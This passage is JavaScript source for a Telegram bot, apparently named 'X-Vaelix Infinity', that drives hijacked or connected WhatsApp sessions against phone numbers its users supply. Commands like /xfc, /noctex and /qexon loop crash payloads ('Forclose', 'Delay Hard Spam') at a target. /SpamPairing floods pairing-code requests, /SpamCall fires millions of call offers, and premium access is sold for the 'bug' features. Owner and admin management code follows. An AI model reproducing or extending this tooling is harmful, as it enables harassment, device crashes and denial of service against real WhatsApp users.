  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);
  let joined = await checkJoined(userId)

if (!joined) {
return sendJoinMessage(chatId)
}
  
    if (commandLocks["/xoya"] === true) {
    return bot.sendMessage(chatId, "❌ Command /xoya sedang dalam keadaan *OFF* (terkunci).\nSilakan minta owner untuk membukanya dengan `/buka /xoya`", { parse_mode: "Markdown" });
  }

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `𝖥𝗂𝗍𝗎𝗋𝖾 𝖡𝗎𝗀 𝖲𝖾𝖽𝖺𝗇𝗀 𝖩𝖾𝖽𝖺 ${cooldown}s, 𝖩𝗂𝗄𝖺 𝖨𝗇𝗀𝗂𝗇 𝖬𝖾𝗇𝗀𝖺𝗍𝗎𝗋 𝖩𝖾𝖽𝖺 𝖲𝗂𝗅𝖺𝗁𝗄𝖺𝗇 𝖦𝗎𝗇𝖺𝗄𝖺𝗇 /setcd 0s`);
  }

  if (!premiumUsers.some((user) => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `\`\`\`
✦ Access Denied ✦

User : @${msg.from.username || "unknown"}
( ! ) You do not have access
Please add Premium before using Bug features ✦\`\`\``,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "( 👤 ) 𝗔𝘂𝘁𝗵𝗼𝗿", url: "https://RannNewEra ", style: "primary" }]],
      },
    });
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /connect 62xxx");
    }

    // Kirim pesan proses (tombol merah)
    const sentMessage = await bot.sendMessage(
      chatId,
      `
\`\`\`JavaScript
X-Vaelix Infinity - New
\`\`\`\`\`\`Notification
┌──────────────────────────
│𖦲 Pengirim : @${msg.from.username || "unknown"}
│𖦲 Bugs  : Delay Hard Spam V7
│𖦲 Target : ${formattedNumber}
│𖦲 Status : Process Send Bugs
│⚠️ 𝗧𝗮𝗿𝗴𝗲𝘁 𝗧𝗲𝗹𝗮𝗵 𝗧𝘂𝗺𝗯𝗮𝗻𝗴, 𝗚𝘂𝗻𝗮𝗸𝗮𝗻
│𝗦𝗰𝗿𝗶𝗽𝘁 𝗜𝗻𝗶 𝗗𝗲𝗻𝗴𝗮𝗻 𝗦𝗲𝗯𝗷𝗶𝗸𝗮𝗻 𝗠𝘂𝗻𝗴𝗸𝗶𝗻
└──────────────────────────\`\`\`
`,
      {
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[{ text: "🕓 𝗣𝗿𝗼𝗰𝗲𝘀𝘀 ☇ 𝗕𝘂𝗴𝘀", url: `https://wa.me/${formattedNumber}`, style: "success" }]],
        },
      }
    );

    let count = 0;
    console.log("\x1b[32m[PROSES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    for (let i = 0; i < 4; i++) {
      await VnXdelayInvisibleNews(sock, target);
      await sleep(2000);  
      console.log(chalk.red(`[X-Vaelix Infinity] BUG Processing ${count}/Infinity Loop To ${formattedNumber}`));
      count++;
    }
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

    // Edit pesan menjadi sukses (tombol hijau)
    await bot.editMessageText(
      `
\`\`\`JavaScript
X-Vaelix Infinity - New
\`\`\`\`\`\`Notification
┌──────────────────────────
│𖦲 Pengirim : @${msg.from.username || "unknown"}
│𖦲 Bugs  : Delay Hard Spam V7
│𖦲 Target : ${formattedNumber}
│𖦲 Status : Succesfully Send Bugs
│⚠️ 𝗧𝗮𝗿𝗴𝗲𝘁 𝗧𝗲𝗹𝗮𝗵 𝗧𝘂𝗺𝗯𝗮𝗻𝗴, 𝗚𝘂𝗻𝗮𝗸𝗮𝗻
│𝗦𝗰𝗿𝗶𝗽𝘁 𝗜𝗻𝗶 𝗗𝗲𝗻𝗴𝗮𝗻 𝗦𝗲𝗯𝗷𝗶𝗸𝗮𝗻 𝗠𝘂𝗻𝗴𝗸𝗶𝗻
└──────────────────────────\`\`\`
`,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[{ text: "📱 𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${formattedNumber}`, style: "success" }]],
        },
      }
    );
  } catch (error) {
    bot.sendMessage(chatId, `❌ 𝗘𝗿𝗿𝗼𝗿 𝗕𝘂𝗴𝘀 𝗧𝗮𝗿𝗴𝗲𝘁: ${error.message}`);
  }
});

bot.onText(/\/xfc (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);
  let joined = await checkJoined(userId)

if (!joined) {
return sendJoinMessage(chatId)
}
  
    if (commandLocks["/xfc"] === true) {
    return bot.sendMessage(chatId, "❌ Command /xfc sedang dalam keadaan *OFF* (terkunci).\nSilakan minta owner untuk membukanya dengan `/buka /xfc`", { parse_mode: "Markdown" });
  }

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `𝖥𝗂𝗍𝗎𝗋𝖾 𝖡𝗎𝗀 𝖲𝖾𝖽𝖺𝗇𝗀 𝖩𝖾𝖽𝖺 ${cooldown}s, 𝖩𝗂𝗄𝖺 𝖨𝗇𝗀𝗂𝗇 𝖬𝖾𝗇𝗀𝖺𝗍𝗎𝗋 𝖩𝖾𝖽𝖺 𝖲𝗂𝗅𝖺𝗁𝗄𝖺𝗇 𝖦𝗎𝗇𝖺𝗄𝖺𝗇 /setcd 0s`);
  }

  if (!premiumUsers.some((user) => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `\`\`\`
✦ Access Denied ✦

User : @${msg.from.username || "unknown"}
( ! ) You do not have access
Please add Premium before using Bug features ✦\`\`\``,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "( 👤 ) 𝗔𝘂𝘁𝗵𝗼𝗿", url: "https://RannNewEra ", style: "primary" }]],
      },
    });
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /connect 62xxx");
    }

    // Kirim pesan proses (tombol merah)
    const sentMessage = await bot.sendMessage(
      chatId,
      `
\`\`\`JavaScript
X-Vaelix Infinity - New
\`\`\`\`\`\`Notification
┌──────────────────────────
│𖦲 Pengirim : @${msg.from.username || "unknown"}
│𖦲 Bugs  : FORCLOSE SPAM
│𖦲 Target : ${formattedNumber}
│𖦲 Status : Process Send Bugs
│⚠️ 𝗧𝗮𝗿𝗴𝗲𝘁 𝗧𝗲𝗹𝗮𝗵 𝗧𝘂𝗺𝗯𝗮𝗻𝗴, 𝗚𝘂𝗻𝗮𝗸𝗮𝗻
│𝗦𝗰𝗿𝗶𝗽𝘁 𝗜𝗻𝗶 𝗗𝗲𝗻𝗴𝗮𝗻 𝗦𝗲𝗯𝗷𝗶𝗸𝗮𝗻 𝗠𝘂𝗻𝗴𝗸𝗶𝗻
└──────────────────────────\`\`\`
`,
      {
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[{ text: "🕓 𝗣𝗿𝗼𝗰𝗲𝘀𝘀 ☇ 𝗕𝘂𝗴𝘀", url: `https://wa.me/${formattedNumber}`, style: "success" }]],
        },
      }
    );

    let count = 0;
    console.log("\x1b[32m[PROSES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    for (let i = 0; i < 1; i++) {
      await ResoulPayCrash(sock, target);
      await sleep(2000);  
      console.log(chalk.red(`[X-Vaelix Infinity] BUG Processing ${count}/Infinity Loop To ${formattedNumber}`));
      count++;
    }
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

    // Edit pesan menjadi sukses (tombol hijau)
    await bot.editMessageText(
      `
\`\`\`JavaScript
X-Vaelix Infinity - New
\`\`\`\`\`\`Notification
┌──────────────────────────
│𖦲 Pengirim : @${msg.from.username || "unknown"}
│𖦲 Bugs  : FORCLOSE SPAM
│𖦲 Target : ${formattedNumber}
│𖦲 Status : Succesfully Send Bugs
│⚠️ 𝗧𝗮𝗿𝗴𝗲𝘁 𝗧𝗲𝗹𝗮𝗵 𝗧𝘂𝗺𝗯𝗮𝗻𝗴, 𝗚𝘂𝗻𝗮𝗸𝗮𝗻
│𝗦𝗰𝗿𝗶𝗽𝘁 𝗜𝗻𝗶 𝗗𝗲𝗻𝗴𝗮𝗻 𝗦𝗲𝗯𝗷𝗶𝗸𝗮𝗻 𝗠𝘂𝗻𝗴𝗸𝗶𝗻
└──────────────────────────\`\`\`
`,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[{ text: "📱 𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${formattedNumber}`, style: "success" }]],
        },
      }
    );
  } catch (error) {
    bot.sendMessage(chatId, `❌ 𝗘𝗿𝗿𝗼𝗿 𝗕𝘂𝗴𝘀 𝗧𝗮𝗿𝗴𝗲𝘁: ${error.message}`);
  }
});

bot.onText(/\/noctex (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);
  
    if (commandLocks["/noctex"] === true) {
    return bot.sendMessage(chatId, "❌ Command /noctex sedang dalam keadaan *OFF* (terkunci).\nSilakan minta owner untuk membukanya dengan `/buka /noctex`", { parse_mode: "Markdown" });
  }

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `𝖥𝗂𝗍𝗎𝗋𝖾 𝖡𝗎𝗀 𝖲𝖾𝖽𝖺𝗇𝗀 𝖩𝖾𝖽𝖺 ${cooldown}s, 𝖩𝗂𝗄𝖺 𝖨𝗇𝗀𝗂𝗇 𝖬𝖾𝗇𝗀𝖺𝗍𝗎𝗋 𝖩𝖾𝖽𝖺 𝖲𝗂𝗅𝖺𝗁𝗄𝖺𝗇 𝖦𝗎𝗇𝖺𝗄𝖺𝗇 /setcd 0s`);
  }

  if (!premiumUsers.some((user) => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `\`\`\`
✦ Access Denied ✦

User : @${msg.from.username || "unknown"}
( ! ) You do not have access
Please add Premium before using Bug features ✦\`\`\``,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "( 👤 ) 𝗔𝘂𝘁𝗵𝗼𝗿", url: "https://RannNewEra ", style: "primary" }]],
      },
    });
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /connect 62xxx");
    }

    // Kirim pesan proses (tombol merah)
    const sentMessage = await bot.sendMessage(
      chatId,
      `
\`\`\`JavaScript
X-Vaelix Infinity - New
\`\`\`\`\`\`Notification
┌──────────────────────────
│𖦲 Pengirim : @${msg.from.username || "unknown"}
│𖦲 Bugs  : Forclose Ios Invisible 
│𖦲 Target : ${formattedNumber}
│𖦲 Status : Process Send Bugs
│⚠️ 𝗧𝗮𝗿𝗴𝗲𝘁 𝗧𝗲𝗹𝗮𝗵 𝗧𝘂𝗺𝗯𝗮𝗻𝗴, 𝗚𝘂𝗻𝗮𝗸𝗮𝗻
│𝗦𝗰𝗿𝗶𝗽𝘁 𝗜𝗻𝗶 𝗗𝗲𝗻𝗴𝗮𝗻 𝗦𝗲𝗯𝗷𝗶𝗸𝗮𝗻 𝗠𝘂𝗻𝗴𝗸𝗶𝗻
└──────────────────────────\`\`\`
`,
      {
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[{ text: "🕓 𝗣𝗿𝗼𝗰𝗲𝘀𝘀 ☇ 𝗕𝘂𝗴𝘀", url: `https://wa.me/${formattedNumber}`, style: "success" }]],
        },
      }
    );

    let count = 0;
    console.log("\x1b[32m[PROSES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    for (let i = 0; i < 50; i++) {
      await nexi(sock, target);
      await sleep(1500);  
      console.log(chalk.red(`[X-Vaelix Infinity] BUG Processing ${count}/Infinity Loop To ${formattedNumber}`));
      count++;
    }
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

    // Edit pesan menjadi sukses (tombol hijau)
    await bot.editMessageText(
      `
\`\`\`JavaScript
X-Vaelix Infinity - New
\`\`\`\`\`\`Notification
┌──────────────────────────
│𖦲 Pengirim : @${msg.from.username || "unknown"}
│𖦲 Bugs  : Forclose Ios Invisible 
│𖦲 Target : ${formattedNumber}
│𖦲 Status : Succesfully Send Bugs
│⚠️ 𝗧𝗮𝗿𝗴𝗲𝘁 𝗧𝗲𝗹𝗮𝗵 𝗧𝘂𝗺𝗯𝗮𝗻𝗴, 𝗚𝘂𝗻𝗮𝗸𝗮𝗻
│𝗦𝗰𝗿𝗶𝗽𝘁 𝗜𝗻𝗶 𝗗𝗲𝗻𝗴𝗮𝗻 𝗦𝗲𝗯𝗷𝗶𝗸𝗮𝗻 𝗠𝘂𝗻𝗴𝗸𝗶𝗻
└──────────────────────────\`\`\`
`,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[{ text: "📱 𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${formattedNumber}`, style: "success" }]],
        },
      }
    );
  } catch (error) {
    bot.sendMessage(chatId, `❌ 𝗘𝗿𝗿𝗼𝗿 𝗕𝘂𝗴𝘀 𝗧𝗮𝗿𝗴𝗲𝘁: ${error.message}`);
  }
});

bot.onText(/\/qexon (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);
  
    if (commandLocks["/qexon"] === true) {
    return bot.sendMessage(chatId, "❌ Command /qexon sedang dalam keadaan *OFF* (terkunci).\nSilakan minta owner untuk membukanya dengan `/buka /qexon`", { parse_mode: "Markdown" });
  }

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `𝖥𝗂𝗍𝗎𝗋𝖾 𝖡𝗎𝗀 𝖲𝖾𝖽𝖺𝗇𝗀 𝖩𝖾𝖽𝖺 ${cooldown}s, 𝖩𝗂𝗄𝖺 𝖨𝗇𝗀𝗂𝗇 𝖬𝖾𝗇𝗀𝖺𝗍𝗎𝗋 𝖩𝖾𝖽𝖺 𝖲𝗂𝗅𝖺𝗁𝗄𝖺𝗇 𝖦𝗎𝗇𝖺𝗄𝖺𝗇 /setcd 0s`);
  }

  if (!premiumUsers.some((user) => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `\`\`\`
✦ Access Denied ✦

User : @${msg.from.username || "unknown"}
( ! ) You do not have access
Please add Premium before using Bug features ✦\`\`\``,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "( 👤 ) 𝗔𝘂𝘁𝗵𝗼𝗿", url: "https://RannNewEra ", style: "primary" }]],
      },
    });
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /connect 62xxx");
    }

    // Kirim pesan proses (tombol merah)
    const sentMessage = await bot.sendMessage(
      chatId,
      `
\`\`\`JavaScript
X-Vaelix Infinity - New
\`\`\`\`\`\`Notification
┌──────────────────────────
│𖦲 Pengirim : @${msg.from.username || "unknown"}
│𖦲 Bugs  : Forclose Ios
│𖦲 Target : ${formattedNumber}
│𖦲 Status : Process Send Bugs
│⚠️ 𝗧𝗮𝗿𝗴𝗲𝘁 𝗧𝗲𝗹𝗮𝗵 𝗧𝘂𝗺𝗯𝗮𝗻𝗴, 𝗚𝘂𝗻𝗮𝗸𝗮𝗻
│𝗦𝗰𝗿𝗶𝗽𝘁 𝗜𝗻𝗶 𝗗𝗲𝗻𝗴𝗮𝗻 𝗦𝗲𝗯𝗷𝗶𝗸𝗮𝗻 𝗠𝘂𝗻𝗴𝗸𝗶𝗻
└──────────────────────────\`\`\`
`,
      {
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[{ text: "🕓 𝗣𝗿𝗼𝗰𝗲𝘀𝘀 ☇ 𝗕𝘂𝗴𝘀", url: `https://wa.me/${formattedNumber}`, style: "success" }]],
        },
      }
    );

    let count = 0;
    console.log("\x1b[32m[PROSES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    for (let i = 0; i < 40; i++) {
      await nexi(target);
      await sleep(1500);  
      console.log(chalk.red(`[X-Vaelix Infinity] BUG Processing ${count}/Infinity Loop To ${formattedNumber}`));
      count++;
    }
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

    // Edit pesan menjadi sukses (tombol hijau)
    await bot.editMessageText(
      `
\`\`\`JavaScript
X-Vaelix Infinity - New
\`\`\`\`\`\`Notification
┌──────────────────────────
│𖦲 Pengirim : @${msg.from.username || "unknown"}
│𖦲 Bugs  : Forclose Ios
│𖦲 Target : ${formattedNumber}
│𖦲 Status : Succesfully Send Bugs
│⚠️ 𝗧𝗮𝗿𝗴𝗲𝘁 𝗧𝗲𝗹𝗮𝗵 𝗧𝘂𝗺𝗯𝗮𝗻𝗴, 𝗚𝘂𝗻𝗮𝗸𝗮𝗻
│𝗦𝗰𝗿𝗶𝗽𝘁 𝗜𝗻𝗶 𝗗𝗲𝗻𝗴𝗮𝗻 𝗦𝗲𝗯𝗷𝗶𝗸𝗮𝗻 𝗠𝘂𝗻𝗴𝗸𝗶𝗻
└──────────────────────────\`\`\`
`,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[{ text: "📱 𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${formattedNumber}`, style: "success" }]],
        },
      }
    );
  } catch (error) {
    bot.sendMessage(chatId, `❌ 𝗘𝗿𝗿𝗼𝗿 𝗕𝘂𝗴𝘀 𝗧𝗮𝗿𝗴𝗲𝘁: ${error.message}`);
  }
});

bot.onText(/\/hecte (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);
  
    if (commandLocks["/hecte"] === true) {
    return bot.sendMessage(chatId, "❌ Command /hecte sedang dalam keadaan *OFF* (terkunci).\nSilakan minta owner untuk membukanya dengan `/buka /hecte`", { parse_mode: "Markdown" });
  }

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `𝖥𝗂𝗍𝗎𝗋𝖾 𝖡𝗎𝗀 𝖲𝖾𝖽𝖺𝗇𝗀 𝖩𝖾𝖽𝖺 ${cooldown}s, 𝖩𝗂𝗄𝖺 𝖨𝗇𝗀𝗂𝗇 𝖬𝖾𝗇𝗀𝖺𝗍𝗎𝗋 𝖩𝖾𝖽𝖺 𝖲𝗂𝗅𝖺𝗁𝗄𝖺𝗇 𝖦𝗎𝗇𝖺𝗄𝖺𝗇 /setcd 0s`);
  }

  if (!premiumUsers.some((user) => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `\`\`\`
✦ Access Denied ✦

User : @${msg.from.username || "unknown"}
( ! ) You do not have access
Please add Premium before using Bug features ✦\`\`\``,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "( 👤 ) 𝗔𝘂𝘁𝗵𝗼𝗿", url: "https://RannNewEra ", style: "primary" }]],
      },
    });
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /connect 62xxx");
    }

    // Kirim pesan proses (tombol merah)
    const sentMessage = await bot.sendMessage(
      chatId,
      `
\`\`\`JavaScript
X-Vaelix Infinity - New
\`\`\`\`\`\`Notification
┌──────────────────────────
│𖦲 Pengirim : @${msg.from.username || "unknown"}
│𖦲 Bugs  : Forclose Ios V2
│𖦲 Target : ${formattedNumber}
│𖦲 Status : Process Send Bugs
│⚠️ 𝗧𝗮𝗿𝗴𝗲𝘁 𝗧𝗲𝗹𝗮𝗵 𝗧𝘂𝗺𝗯𝗮𝗻𝗴, 𝗚𝘂𝗻𝗮𝗸𝗮𝗻
│𝗦𝗰𝗿𝗶𝗽𝘁 𝗜𝗻𝗶 𝗗𝗲𝗻𝗴𝗮𝗻 𝗦𝗲𝗯𝗷𝗶𝗸𝗮𝗻 𝗠𝘂𝗻𝗴𝗸𝗶𝗻
└──────────────────────────\`\`\`
`,
      {
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[{ text: "🕓 𝗣𝗿𝗼𝗰𝗲𝘀𝘀 ☇ 𝗕𝘂𝗴𝘀", url: `https://wa.me/${formattedNumber}`, style: "success" }]],
        },
      }
    );

    let count = 0;
    console.log("\x1b[32m[PROSES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    for (let i = 0; i < 40; i++) {
      await nexi(target);
      await sleep(5000);  
      console.log(chalk.red(`[X-Vaelix Infinity] BUG Processing ${count}/Infinity Loop To ${formattedNumber}`));
      count++;
    }
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

    // Edit pesan menjadi sukses (tombol hijau)
    await bot.editMessageText(
      `
\`\`\`JavaScript
X-Vaelix Infinity - New
\`\`\`\`\`\`Notification
┌──────────────────────────
│𖦲 Pengirim : @${msg.from.username || "unknown"}
│𖦲 Bugs  : Forclose Ios V2
│𖦲 Target : ${formattedNumber}
│𖦲 Status : Succesfully Send Bugs
│⚠️ 𝗧𝗮𝗿𝗴𝗲𝘁 𝗧𝗲𝗹𝗮𝗵 𝗧𝘂𝗺𝗯𝗮𝗻𝗴, 𝗚𝘂𝗻𝗮𝗸𝗮𝗻
│𝗦𝗰𝗿𝗶𝗽𝘁 𝗜𝗻𝗶 𝗗𝗲𝗻𝗴𝗮𝗻 𝗦𝗲𝗯𝗷𝗶𝗸𝗮𝗻 𝗠𝘂𝗻𝗴𝗸𝗶𝗻
└──────────────────────────\`\`\`
`,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[{ text: "📱 𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${formattedNumber}`, style: "success" }]],
        },
      }
    );
  } catch (error) {
    bot.sendMessage(chatId, `❌ 𝗘𝗿𝗿𝗼𝗿 𝗕𝘂𝗴𝘀 𝗧𝗮𝗿𝗴𝗲𝘁: ${error.message}`);
  }
});

//------------------------------------------------------------------------------------------------------------------------------\\
function extractGroupID(link) {
  try {
    if (link.includes("chat.whatsapp.com/")) {
      return link.split("chat.whatsapp.com/")[1];
    }
    return null;
  } catch {
    return null;
  }
}

bot.onText(/\/SpamPairing (\d+)\s*(\d+)?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  if (!isOwner(userId)) {
    return bot.sendMessage(
      chatId,
      "❌ Kamu tidak punya izin untuk menjalankan perintah ini."
    );
  }

  const target = match[1];
  const count = parseInt(match[2]) || 999999;

  bot.sendMessage(
    chatId,
    `Mengirim Spam Pairing ${count} ke nomor ${target}...`
  );

  try {
    const { state } = await useMultiFileAuthState("senzypairing");
    const { version } = await fetchLatestBaileysVersion();

    const sucked = await makeWASocket({
      printQRInTerminal: false,
      mobile: false,
      auth: state,
      version,
      logger: pino({ level: "fatal" }),
      browser: ["Mac Os", "chrome", "121.0.6167.159"],
    });

    for (let i = 0; i < count; i++) {
      await sleep(1600);
      try {
        await sucked.requestPairingCode(target);
      } catch (e) {
        console.error(`Gagal spam pairing ke ${target}:`, e);
      }
    }

    bot.sendMessage(chatId, `Selesai spam pairing ke ${target}.`);
  } catch (err) {
    console.error("Error:", err);
    bot.sendMessage(chatId, "Terjadi error saat menjalankan spam pairing.");
  }
});

bot.onText(/\/SpamCall(?:\s(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;
  // Check if the command is used in the allowed group

    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /connect 62xxx"
      );
    }
    
if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(
      chatId,
      "❌ You are not authorized to view the premium list."
    );
  }

  if (!match[1]) {
    return bot.sendMessage(
      chatId,
      "🚫 Missing input. Please provide a target number. Example: /overload 62×××."
    );
  }

  const numberTarget = match[1].replace(/[^0-9]/g, "").replace(/^\+/, "");
  if (!/^\d+$/.test(numberTarget)) {
    return bot.sendMessage(
      chatId,
      "🚫 Invalid input. Example: /overload 62×××."
    );
  }

  const formatedNumber = numberTarget + "@s.whatsapp.net";

  await bot.sendPhoto(chatId, "https://files.catbox.moe/nr8exs.jpg", {
    caption: `┏━━━━━━〣 𝙽𝚘𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚒𝚘𝚗 〣━━━━━━┓
┃〢 Tᴀʀɢᴇᴛ : ${numberTarget}
┃〢 Cᴏᴍᴍᴀɴᴅ : /spamcall
┃〢 Wᴀʀɴɪɴɢ : ᴜɴʟɪᴍɪᴛᴇᴅ ᴄᴀʟʟ
┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛`,
  });

  for (let i = 0; i < 9999999; i++) {
    await sendOfferCall(formatedNumber);
    await sendOfferVideoCall(formatedNumber);
    await new Promise((r) => setTimeout(r, 1000));
  }
});

//=======case owner=======//
bot.onText(/\/deladmin(?:\s(\d+))?/, (msg, match) => {
    const chatId = msg.chat.id;

  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ Akses Ditolak\nAnda tidak memiliki izin untuk menggunakan command ini.",
      {
        parse_mode: "Markdown",
      }
    );
  }

    // Cek apakah pengguna memiliki izin (hanya pemilik yang bisa menjalankan perintah ini)
    if (!isOwner(senderId)) {
        return bot.sendMessage(
            chatId,
            "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
            { parse_mode: "Markdown" }
        );
    }

    // Pengecekan input dari pengguna
    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide a user ID. Example: /deladmin 123456789.");
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
    if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(chatId, "❌ Invalid input. Example: /deladmin 6843967527.");
    }

    // Cari dan hapus user dari adminUsers
    const adminIndex = adminUsers.indexOf(userId);
    if (adminIndex !== -1) {
        adminUsers.splice(adminIndex, 1);
        saveAdminUsers();
        console.log(`${senderId} Removed ${userId} From Admin`);
        bot.sendMessage(chatId, `✅ User ${userId} has been removed from admin.`);
    } else {
        bot.sendMessage(chatId, `❌ User ${userId} is not an admin.`);
    }
});

bot.onText(/\/addadmin(?:\s(.+))?/, (msg, match) => {
    const chatId = msg.chat.id;

  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ Akses Ditolak\nAnda tidak memiliki izin untuk menggunakan command ini.",
      {
        parse_mode: "Markdown",
      }
    );
  }

    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide a user ID. Example: /addadmin 123456789.");
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
    if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(chatId, "❌ Invalid input. Example: /addadmin 6843967527.");
    }

    if (!adminUsers.includes(userId)) {
        adminUsers.push(userId);
        saveAdminUsers();
        console.log(`${senderId} Added ${userId} To Admin`);
        bot.sendMessage(chatId, `✅ User ${userId} has been added as an admin.`);
    } else {
        bot.sendMessage(chatId, `❌ User ${userId} is already an admin.`);
    }
});


bot.onText(/\/addowner (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;

  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ Akses Ditolak\nAnda tidak memiliki izin untuk menggunakan command ini.",
      {
        parse_mode: "Markdown",
      }
    );
  }

  const newOwnerId = match[1].trim();

  try {
    const configPath = "./config.js";
    const configContent = fs.readFileSync(configPath, "utf8");

    if (config.OWNER_ID.includes(newOwnerId)) {
      return bot.sendMessage(
        chatId,
        `\`\`\`
╭─────────────────
│    GAGAL MENAMBAHKAN    
│────────────────
│ User ${newOwnerId} sudah
│ terdaftar sebagai owner
╰─────────────────\`\`\``,
        {
          parse_mode: "Markdown",
        }
      );
    }

